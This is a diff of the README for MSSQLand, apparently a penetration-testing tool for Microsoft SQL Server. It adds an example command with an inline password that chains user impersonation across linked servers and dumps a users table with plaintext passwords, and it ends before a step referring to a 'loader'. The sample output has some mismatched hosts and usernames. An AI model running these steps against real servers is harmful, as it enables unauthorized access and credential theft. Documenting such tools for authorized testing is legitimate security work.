@@ -9,6 +9,38 @@ MSSQLand is your ultimate tool for interacting with Microsoft SQL Server (MSSQL)
 
 The tool's precise and structured output is surrounded by timestamps and enriched with useful information, making it perfect for capturing beautiful screenshots in your reports.
 
+For example, running this command:
+```shell
+MSSQLand.exe /t:SQL01:webapp01 /u:mjo /p:yapot117 /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:rows balard..users
+```
+
+```txt
+====================================
+  Start at 2025-01-15 21:53:53
+====================================
+[>] Trying to connect with TokenCredentials
+[+] Connection opened successfully
+|-> Workstation ID: SQL11
+|-> Server Version: 15.00.2000
+|-> Database: master
+|-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
+[i] You can impersonate anyone as a sysadmin
+[+] Successfully impersonated user: webapp11
+[>] Executing action: Rows
+|-> Retrieving rows from [balard].[dbo].[users]
+
+| id | name         | password            |
+| -- | ------------ | ------------------- |
+| 0  | Jacquard     | Jacqu@rd!1940%Tr1c  |
+| 1  | Calot        | C@l0t$Agent#42%Espi |
+| 2  | Moulinier    | Moul!ni3r#V1ve*FR@  |
+
+====================================
+  End at 2025-01-15 21:53:53 UTC
+  Total duration: 0.11 seconds
+====================================
+```
+
 ## Show Time 👑
 The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` as `user1`. Then you need to impersonate `user2` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `user3` in order to go further and so on and so forth.
 
@@ -22,9 +54,9 @@ MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL
 
 The output is as follows:
 ```txt
-================================
-  Start at 2025-01-14 08:31:39
-================================
+====================================
+  Start at 2025-01-14 21:31:39 UTC
+====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
 |-> Workstation ID: SQL01
@@ -45,10 +77,10 @@ The output is as follows:
 | ------------- | ---------- | -------- | ----------- | ----------- | --------------- | ------------ |
 | SQL05         | SQL Server | SQLNCLI  | SQL04       | webapp05    | False           | webadmin     |
 
-================================
-  End at 2025-01-14 08:31:39
+====================================
+  End at 2025-01-14 21:31:39 UTC
   Total duration: 0.08 seconds
-================================
+====================================
 ```
 
 Now you want to verify who you can impersonate at the end of the chain:
@@ -58,9 +90,9 @@ MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL
 The output shows:
 
 ```txt
-================================
-  Start at 2025-01-14 08:35:22
-================================
+====================================
+  Start at 2025-01-14 08:35:22 UTC
+====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
 |-> Workstation ID: SQL01
@@ -80,15 +112,14 @@ The output shows:
 | Logins      | Impersonation |
 | ----------- | ------------- |
 | sa          | No            |
-| Merlaux     | No            |
 | Jacquard    | Yes           |
 | Calot       | No            |
 | Moulinier   | No            |
 
-================================
+====================================
   End at 2025-01-14 08:35:22
   Total duration: 0.10 seconds
-================================
+====================================
 ```
 
 Great! Now you can directly reach out to your loader with:
